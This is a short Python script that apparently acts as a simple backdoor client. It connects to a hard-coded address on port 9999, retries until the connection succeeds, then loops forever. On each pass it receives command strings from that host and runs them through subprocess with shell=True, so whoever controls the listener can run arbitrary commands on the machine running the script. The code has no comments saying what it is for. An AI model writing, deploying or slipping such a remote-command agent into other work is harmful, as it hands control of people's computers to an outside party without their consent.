import socket
import subprocess
import time

sock = socket.socket()

host = '192.168.0.164'
port = 9999


def connect():
    try:
        sock.connect((host, port))

    except socket.error:
        connect()
    time.sleep(0.5)


connect()
print('Connected!')

while True:
    cmd = sock.recv(100).decode()
    if cmd:
        if 'process' in globals():
            pass
        # process.stdin.flush()

        process = subprocess.Popen(cmd.split(), shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   universal_newlines=True)

        out, err = process.communicate(cmd)

        if out:
            print(out)

        if err:
            print(err)

        # if process.poll() is None:
        #     cmd = sock.recv(100).decode() + '\n'
        #     if cmd:
        #         process.communicate(cmd)
